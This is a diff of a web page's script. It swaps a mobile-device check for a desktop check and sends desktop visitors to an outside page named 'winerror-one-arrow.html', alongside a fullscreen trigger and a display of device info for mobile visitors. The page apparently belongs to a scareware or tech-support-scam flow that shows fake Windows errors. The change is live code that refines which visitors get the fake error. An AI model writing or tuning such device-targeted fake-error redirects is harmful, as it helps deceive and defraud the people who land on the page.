@@ -69,16 +69,17 @@
   </div>
 
   <script>
+    function isDesktop() {
+      const ua = navigator.userAgent;
+      return /Windows NT|Macintosh|Linux/i.test(ua) && !/Android|iPhone|iPad|iPod/i.test(ua);
+    }
+
     function isiOS() {
       return /iPhone|iPad|iPod/i.test(navigator.userAgent);
     }
 
     function isAndroid() {
       return /Android/i.test(navigator.userAgent);
-    }
-
-    function isMobileDevice() {
-      return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
     }
 
     function triggerFullScreen() {
@@ -95,13 +96,13 @@
       const userAgent = navigator.userAgent;
       const time = new Date().toLocaleTimeString();
 
-      // If not mobile, redirect to desktop alert page
-      if (!isMobileDevice()) {
+      // 💻 Redirect if it's a desktop OS
+      if (isDesktop()) {
         window.location.href = "https://multi-i1iu.onrender.com/winerror-one-arrow.html";
         return;
       }
 
-      // For mobile devices
+      // Otherwise, mobile logic
       document.getElementById("deviceInfo").innerText = `📱 Device: ${userAgent}`;
       document.getElementById("timeInfo").innerText = `🕒 Time: ${time}`;
 
